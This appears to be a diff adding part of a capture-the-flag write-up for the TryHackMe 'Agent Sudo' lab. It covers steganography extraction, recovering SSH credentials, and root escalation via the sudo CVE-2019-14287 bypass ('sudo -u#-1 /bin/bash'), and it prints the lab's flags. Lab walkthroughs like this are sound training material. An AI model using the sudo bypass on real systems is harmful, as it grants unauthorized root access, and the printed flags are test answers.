@@ -162,6 +162,92 @@ Compressed: 280
 ```
 We can now access the content of the file. Accessing this we find a "To_agentR.txt" file.
 ```
-
+└─$ cat To_agentR.txt
+Agent C,
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+By,
+Agent R
 ```
+This looks like a base64 ciphertext
+```
+└─$ echo "QXJlYTUx" | base64 -d
+Area51
+```
+Area51 seems to be our password. We can now look into the alien picture.
+```
+└─$ steghide extract -sf cute-alien.jpg
+Enter passphrase:
+wrote extracted data to "message.txt". 
+```
+Viewing message.txt:
+```
+└─$ cat message.txt
+Hi james,
+Glad you find this message. Your login password is hackerrules!
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+Your buddy,
+chris 
+```
+We now have a user and password combanation for user christ, we will now login to ssh with these credentials
+```
+james@agent-sudo:~$ ls -la
+total 80
+drwxr-xr-x 4 james james  4096 Oct 29  2019 .
+drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
+-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
+-rw------- 1 root  root    566 Oct 29  2019 .bash_history
+-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
+drwx------ 2 james james  4096 Oct 29  2019 .cache
+drwx------ 3 james james  4096 Oct 29  2019 .gnupg
+-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
+-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
+-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
+```
+We can now retrieve the user flag: b03d975e8c92a7c04146cfa7a5a313c7. To view the Alien_autopsy.jpg image we can download it to our local directory and open it using scp and xdg
+```
+└─$ scp james@10.10.83.69:/home/james/Alien_autospy.jpg .
+james@10.10.83.69's password:
+Alien_autospy.jpg
+```
+```
+└─$ xdg-open Alien_autospy.jpg
+```
+![image](https://github.com/user-attachments/assets/315b7194-fb69-4513-93bf-6cc0d56c13a3)
+
+We can reverse image search this online:
+![image](https://github.com/user-attachments/assets/8cd0e437-4c60-493b-9ae7-3a0c0cb24082)
+
+Now to gain root privilages...
+We can check what privilages we have using 
+```
+james@agent-sudo:~$ sudo -l
+[sudo] password for james:
+Matching Defaults entries for james on agent-sudo:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User james may run the following commands on agent-sudo:
+  (ALL, !root) /bin/bash
+```
+(ALL, !root) /bin/bash looks promicing. Finding some information on this command we come across https://www.exploit-db.com/exploits/47502 with CVE: 2019-14287. This vulnerability can be exploited using
+```
+sudo -u#-1 /bin/bash
+```
+as provided in the document
+```
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+root@agent-sudo:~# whoami
+root 
+```
+We now have root privilages!
+```
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.
+Your flag is
+b53a02f55b57d4439e3341834d70c062
+By,
+DesKel a.k.a Agent R 
+```
+And can find the root flag: b53a02f55b57d4439e3341834d70c062
+
 
